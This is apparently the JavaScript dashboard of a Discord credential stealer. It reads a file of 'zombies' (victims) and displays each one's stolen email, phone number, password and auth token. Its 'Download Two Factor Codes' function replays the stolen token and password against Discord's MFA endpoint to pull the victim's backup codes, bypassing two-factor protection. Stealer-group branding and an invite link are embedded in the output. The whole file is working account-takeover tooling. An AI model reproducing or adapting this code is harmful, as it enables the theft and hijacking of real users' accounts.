d3.json("../data/zombies.json", function(error, data) {
    parser = JSON.stringify(data)
    zombies_data = JSON.parse(parser)
    zombies_list = zombies_data.zombies

    zombies_list.forEach(zombie => {
        user_id = document.URL.split("?id=")[1]
        if(!isNaN(user_id) && user_id.length == 18) {
            if(zombie.id == user_id) {
                user = document.getElementById("zombie");
                badges_list = "";
                twofactor = "";

                if(zombie.twofactor == "true") {
                    twofactor += `<button onclick="DownloadTwoFactorCodes()">Download Two Factor Codes</button>`
                }

                zombie.badges.forEach(badge => {
                    if(badge == "balance") {
                        badges_list += `<img src="assets/badges/Balance.png" alt="" srcset="">`
                    
                    } else if(badge == "bravery") {
                        badges_list += `<img src="assets/badges/Bravery.png" alt="" srcset="">`
                    
                    } else if(badge == "brilliance") {
                        badges_list += `<img src="assets/badges/Brilliance.png" alt="" srcset="">`
                    
                    } else if(badge == "bughunter") {
                        badges_list += `<img src="assets/badges/BugHunter.png" alt="" srcset="">`
                    
                    } else if(badge == "dev") {
                        badges_list += `<img src="assets/badges/dev.png" alt="" srcset="">`
                    
                    } else if(badge == "early") {
                        badges_list += `<img src="assets/badges/early.png" alt="" srcset="">`
                    
                    } else if(badge == "hypesquad") {
                        badges_list += `<img src="assets/badges/hypeSquad.png" alt="" srcset="">`
                    
                    } else if(badge == "partner") {
                        badges_list += `<img src="assets/badges/Partner.png" alt="" srcset="">`
                    
                    } else if(badge == "staff") {
                        badges_list += `<img src="assets/badges/Staff.png" alt="" srcset="">`
                    
                    } else if(badge == "verified") {
                        badges_list += `<img src="assets/badges/verif.png" alt="" srcset="">`
                    
                    } else if(badge == "nitroboost") {
                        badges_list += `<img src="assets/badges/Nitro_Boost.png" alt="" srcset="">`
                    
                    } else if(badge == "nitrocl") {
                        badges_list += `<img src="assets/badges/Nitro_cl.png" alt="" srcset="">`
                    
                    }
                })

                user.innerHTML += `
                    <div class="user_infos">
                        <img class="user_pfp" src="https://cdn.discordapp.com/avatars/${zombie.id}/${zombie.avatar}" alt="" srcset="">
                        <div class="user_text_infos">
                            <span>${zombie.username} (${zombie.id})</span>
                            <p id="user_email">${zombie.email}</p>
                            <p>${zombie.phone}</p>
                            <div class="badges">
                                ${badges_list}
                            </div>
                        </div>
                    </div>
                    <div class="personnals_infos">
                        <div class="infos">
                            <div class="custom-input">
                                <label>Password: </label>
                                <input id="user_pass" disabled type="text" value="${zombie.password}" class="select-input">
                            </div>
                            <div class="custom-input">
                                <label>Two Factor: </label>
                                <input disabled type="text" value="${zombie.twofactor}" class="select-input">
                            </div>
                        </div>
                        <div class="custom-input token-input">
                            <label>Token: </label>
                            <input id="user_token" disabled type="text" value="${zombie.token}" class="select-input">
                        </div>
                    </div>
                    <div class="btn">
                        ${twofactor}
                    </div>
                `
            }
        }
    });
});

function DownloadTwoFactorCodes() {
    var user_id = document.URL.split("?id=")[1]

    if(!isNaN(user_id) && user_id.length == 18) {
        var token = document.getElementById("user_token").value;
        var password = document.getElementById("user_pass").value;

        var payload = {
            "password": password,
            "regenerate": false
        }

        try {
            let xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://discord.com/api/v9/users/@me/mfa/codes', true);
            xhr.setRequestHeader('authorization', `${token}`)
            xhr.setRequestHeader('content-type', `application/json`)

            xhr.onload = function () {
                codes = JSON.parse(xhr.response).backup_codes
                backup_codes = `Voici tes codes de sauvegarde pour ton compte Discord. Garde-les précieusement !\n\n`
                codes.forEach(code => {
                    backup_codes += "* " + code.code + "\n"
                })
                backup_codes += "\n\nXenos on the TOP\ndiscord.gg/jyUSstvCBH"

                strDownload(backup_codes, 'backup_codes.txt')
            }

            xhr.send(JSON.stringify(payload))
        
        } catch {
            strDownload(`Impossible de recuperer les codes de sauvgardes, l'email ou le mot de passe est invalide.\n\nXenos on the TOP\ndiscord.gg/jyUSstvCBH`, 'backup_codes.txt')
        }
    }
}

function strDownload(a, b) {
    a = '' + a;
    b = b || 'strDownload.txt';
    var c = document.createElement('A'),
        d = document.body;
    d.appendChild(c);
    c.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(a);
    c.download = b;
    c.click();
    d.removeChild(c);
}